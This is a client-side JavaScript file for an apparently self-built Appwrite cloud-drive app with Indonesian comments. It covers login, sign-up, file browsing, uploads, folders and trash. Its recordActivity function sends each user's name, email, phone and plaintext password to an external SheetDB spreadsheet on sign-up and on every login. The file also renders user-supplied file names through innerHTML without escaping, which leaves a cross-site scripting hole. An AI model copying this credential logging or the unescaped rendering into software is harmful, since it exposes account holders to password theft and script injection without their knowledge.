const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// 1. KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';
client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// ======================================================
// 2. FUNGSI INISIALISASI & KLIK KANAN (POIN UTAMA)
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();
    initNewButtonLogic(); 
    initDragAndDrop();
    initLogout();
    initSearchBar();
    initAllContextMenus(); // Aktifkan semua fitur klik kanan
});

function initAllContextMenus() {
    const globalMenu = el('globalContextMenu'); 
    const fileMenu = el('contextMenu');         
    const newDropdown = el('dropdownMenu');     
    
    const newBtn = el('newBtnMain');
    const navDrive = el('navDrive');            
    const mainArea = document.querySelector('.main-content-area');

    const closeAll = () => {
        if(globalMenu) globalMenu.classList.remove('show');
        if(newDropdown) newDropdown.classList.remove('show');
        if(fileMenu) fileMenu.classList.add('hidden');
    };

    // A. KLIK KANAN: TOMBOL "+ NEW"
    if (newBtn) {
        newBtn.addEventListener('contextmenu', (e) => {
            e.preventDefault(); e.stopPropagation();
            closeAll();
            newDropdown.classList.add('show');
        });
    }

    // B. KLIK KANAN: SIDEBAR "DRIVE SAYA"
    if (navDrive) {
        navDrive.addEventListener('contextmenu', (e) => {
            e.preventDefault(); e.stopPropagation();
            closeAll();
            globalMenu.style.top = `${e.clientY}px`;
            globalMenu.style.left = `${e.clientX}px`;
            globalMenu.classList.add('show');
        });
    }

    // C. KLIK KANAN: AREA KOSONG
    if (mainArea) {
        mainArea.addEventListener('contextmenu', (e) => {
            if (e.target.closest('.item-card')) return; // Biarkan file handle sendiri
            e.preventDefault();
            closeAll();
            globalMenu.style.top = `${e.clientY}px`;
            globalMenu.style.left = `${e.clientX}px`;
            globalMenu.classList.add('show');
        });
    }

    window.addEventListener('click', () => closeAll());
}

// ======================================================
// 3. FUNGSI RENDER ITEM (KLIK KANAN FILE & FOLDER)
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:12px;left:12px;color:#ffd700;"></i>` : '';
    
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif)$/i)) {
        content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    }

    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };

    // LOGIKA KLIK KANAN SPESIFIK FILE/FOLDER
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        
        // Tutup menu global agar tidak tumpang tindih
        el('globalContextMenu').classList.remove('show');
        el('dropdownMenu').classList.remove('show');

        selectedItem = doc;
        const menu = el('contextMenu');
        menu.style.top = `${e.clientY}px`;
        menu.style.left = `${e.clientX}px`;
        menu.classList.remove('hidden');

        if(el('starText')) el('starText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";
        const isTrash = doc.trashed;
        el('trashBtn').classList.toggle('hidden', isTrash);
        el('restoreBtn').classList.toggle('hidden', !isTrash);
        el('permDeleteBtn').classList.toggle('hidden', !isTrash);
    };

    grid.appendChild(div);
}

// ======================================================
// 4. AUTH & SESSION
// ======================================================
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { setTimeout(hideLoading, 500); }
}

async function recordActivity(sheetName, userData) {
    try {
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':');
        const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate };
        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) });
    } catch (error) { console.error("Excel Error:", error); }
}

if(el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone });
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            alert("Sign Up Berhasil!"); window.nav('loginPage');
        } catch(e) { alert(e.message); } finally { hideLoading(); }
    });
}

if(el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
        showLoading();
        try {
            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
                if (res.total === 0) throw new Error("User tidak ditemukan");
                inputId = res.documents[0].email;
            }
            await account.createEmailPasswordSession(inputId, pass);
            const userAuth = await account.get();
            let userPhone = "-";
            try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id); userPhone = userDB.phone || "-"; } catch(e){}
            await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userPhone, password: pass });
            checkSession();
        } catch (error) { alert(error.message); hideLoading(); }
    });
}

function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Yakin ingin keluar?")) {
                showLoading();
                try {
                    if (currentUser) {
                        let userPhone = "-";
                        try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); userPhone = userDB.phone || "-"; } catch(e){}
                        await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email, phone: userPhone, password: "-" });
                    }
                    await account.deleteSession('current'); window.location.reload(); 
                } catch (error) { window.location.reload(); }
            }
        });
    }
}

// ======================================================
// 5. STORAGE, NAV & SEARCH (FITUR LAMA TERJAGA)
// ======================================================
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file'), Appwrite.Query.limit(100)]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|svg|jfif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|avi|mov)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`; el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

window.openStorageModal = () => {
    const total = storageDetail.total || 1;
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;
    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";
    window.openModal('storageModal');
};

function initSearchBar() {
    const input = el('searchInput');
    if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length === 0) loadFiles(currentFolderId);
        else performSearch(query);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.search('name', keyword)]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) {}
}

async function loadFiles(param) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = ''; 
    updateHeaderUI();
    let queries = [Appwrite.Query.equal('owner', currentUser.$id)];
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false));
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true));
    else {
        if (typeof param === 'string' && !['root','recent','trash'].includes(param)) currentFolderId = param;
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false));
    }
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries);
        res.documents.forEach(doc => renderItem(doc));
    } catch (e) {}
}

function updateHeaderUI() {
    const isRoot = currentFolderId === 'root' && currentViewMode === 'root';
    const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night";
    el('headerTitle').innerText = isRoot ? `Welcome In Drive ${s}` : currentFolderName;
    const breadcrumb = document.querySelector('.breadcrumb-area');
    if (!isRoot && !breadcrumb.querySelector('.back-btn')) {
        breadcrumb.insertAdjacentHTML('afterbegin', `<button onclick="goBack()" class="back-btn" style="margin-bottom:10px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button>`);
    } else if (isRoot && breadcrumb.querySelector('.back-btn')) {
        breadcrumb.querySelector('.back-btn').remove();
    }
}

window.goBack = () => { currentFolderId = 'root'; currentFolderName = "Drive"; loadFiles('root'); };
window.openFolder = (id, name) => { currentFolderId = id; currentFolderName = name; loadFiles(id); };

function initNewButtonLogic() {
    const btn = el('newBtnMain'); const menu = el('dropdownMenu');
    if (btn) btn.addEventListener('click', (e) => { e.stopPropagation(); menu.classList.toggle('show'); });
}

function initDragAndDrop() {
    const zone = el('dropZone');
    if (!zone) return;
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(evt => zone.addEventListener(evt, (e) => { e.preventDefault(); e.stopPropagation(); }));
    zone.addEventListener('dragover', () => zone.classList.add('active'));
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => { zone.classList.remove('active'); handleFileSelect(e.dataTransfer.files[0]); });
}

function handleFileSelect(file) {
    selectedUploadFile = file;
    el('fileInfoText').innerText = `Terpilih: ${file.name}`;
    el('fileInfoContainer').classList.remove('hidden');
}

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return;
    showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
        });
        closeModal('uploadModal'); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false });
        closeModal('folderModal'); loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.nav = (p) => { ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden')); el(p).classList.remove('hidden'); };
window.openModal = (id) => { el('globalContextMenu').classList.remove('show'); el('dropdownMenu').classList.remove('show'); el(id).classList.remove('hidden'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => window.openModal('uploadModal');
window.createFolder = () => window.openModal('folderModal');
window.toggleStarItem = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentFolderId); };
window.moveItemToTrash = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentFolderId); };
window.restoreFromTrash = async () => { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); };
window.deleteItemPermanently = async () => { if(confirm("Hapus permanen?")) { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); } };